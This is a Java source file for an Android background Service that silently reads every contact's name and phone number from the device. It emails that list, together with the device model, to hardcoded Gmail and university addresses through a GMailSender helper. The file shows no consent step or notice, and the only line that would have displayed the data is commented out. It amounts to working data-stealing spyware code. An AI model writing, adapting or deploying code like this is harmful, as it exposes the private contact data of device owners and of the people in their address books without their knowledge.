package purvil12c.email0;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.ContactsContract;
import android.support.annotation.Nullable;

import android.util.Log;
import android.widget.Toast;

/**
 * Created by kaushal28 on 10/11/16.
 */

public class Background extends Service {
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private PowerManager.WakeLock wakeLock;

    @Override
    public void onCreate() {
        super.onCreate();

        PowerManager mgr = (PowerManager)this.getSystemService(Context.POWER_SERVICE);
        wakeLock = mgr.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MyWakeLock");
        wakeLock.acquire();



        Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null,null, null);
        String name="",phoneNumber="";
        while (phones.moveToNext())
        {
            name= name + phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))+"\n";
            phoneNumber = phoneNumber + phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))+"\n";

        }
        phones.close();

        String x =name + "\n\n\n" + phoneNumber;
        String model = android.os.Build.MODEL;

      //  Toast.makeText(Background.this,x,Toast.LENGTH_LONG).show();

        try {
            GMailSender sender = new GMailSender("shah.kaushal95@gmail.com", "your_pass_here!",Background.this);
            sender.sendMail(model,
                    x,
                    "shah.kaushal95@gmail.com",
                    "14bce109@nirmauni.ac.in");

        } catch (Exception e) {
            e.printStackTrace();
            Toast.makeText(Background.this,e.getMessage(),Toast.LENGTH_LONG).show();
            Log.e("SendMail", e.getMessage(), e);
        }


    }


    @Override
    public void onDestroy() {
        super.onDestroy();
        wakeLock.release();
    }
}
